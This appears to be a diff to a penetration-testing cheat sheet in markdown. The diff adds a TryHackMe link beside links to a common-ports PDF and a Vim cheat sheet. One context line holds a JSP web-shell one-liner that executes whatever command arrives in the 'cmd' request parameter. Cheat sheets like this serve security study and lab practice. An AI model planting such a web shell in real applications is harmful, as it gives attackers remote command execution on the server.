@@ -115,6 +115,8 @@ same is JSP
 `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
 ## LINKS
 
+### Try "Try Hack Me" - [Try HACK Me](https://tryhackme.com/pricing)
+
 ### Common Ports - [Wayback Machine](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf)
 
 ### VIM Cheat Sheet - [Watch Your Eyez](https://vimsheet.com/)
